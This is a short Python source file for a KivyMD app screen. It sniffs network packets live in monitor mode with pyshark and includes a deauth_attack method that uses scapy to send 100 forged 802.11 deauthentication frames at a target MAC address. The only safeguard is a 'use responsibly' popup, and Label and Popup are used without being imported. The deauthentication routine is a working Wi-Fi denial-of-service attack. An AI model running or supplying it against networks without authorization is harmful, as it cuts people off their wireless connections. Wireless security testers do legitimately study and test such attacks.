import pyshark
from scapy.all import RadioTap, Dot11, sendp
from kivymd.uix.screen import MDScreen
from kivy.clock import Clock
from utils import get_interfaces

class PySharkScreen(MDScreen):

    def on_pre_enter(self):
        # This method is called when the screen is about to be displayed.
        # Update the spinner values here.
        self.ids.interfaces_spinner.values = get_interfaces()

    def start_capture(self):
        interface = self.ids.interfaces_spinner.text
        self.run_pyshark(interface)

    def run_pyshark(self, interface):
        capture = pyshark.LiveCapture(interface=interface, monitor_mode=True)
        capture.apply_on_packets(self.packet_analysis)

    def packet_analysis(self, packet):
        try:
            protocol = packet.transport_layer
            source = packet.ip.src
            destination = packet.ip.dst
            info = f"Protocol: {protocol}, Source: {source}, Destination: {destination}\n"
            Clock.schedule_once(lambda dt: self.update_display(info), 0)
        except AttributeError:
            # Handle non-IP packets
            pass

    def update_display(self, info):
        self.ids.packet_display.text += info

    def show_deauth_warning(self, instance):
        popup_content = Label(text="Deauthentication attack is a sensitive operation. Use responsibly!")
        popup = Popup(title="Warning", content=popup_content, size_hint=(None, None), size=(400, 200))
        popup.open()

    def deauth_attack(self, target_mac, source_mac):
        packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=source_mac, addr3=source_mac)
        sendp(packet, iface=self.ids.interfaces_spinner.text, count=100, inter=0.1)

    # Additional methods as needed
